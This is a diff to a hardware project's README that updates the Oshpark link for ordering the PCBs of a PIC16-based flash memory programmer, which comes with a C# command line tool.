@@ -10,4 +10,4 @@ The firmware on the PIC16 implements a command protocol that runs over a serial 
 
 On the PC, a command line program is provided to read and write to the flash memory.  The command line program is written in Visual C# with Visual Studio.
 
-You can order the PCBs directly from Oshpark with [this](https://oshpark.com/import?url=https://github.com/wilsondr9999/1005-Flash-Programmer/raw/main/KiCAD%20Project/Gerber%20Files/1005%20Flash%20Programmer.zip) link.
+You can order the PCBs directly from Oshpark with [this](https://oshpark.com/import?url=https://github.com/wilsondr9999/1005-Flash-Programmer/raw/main/1005-Flash-Programmer.zip) link.
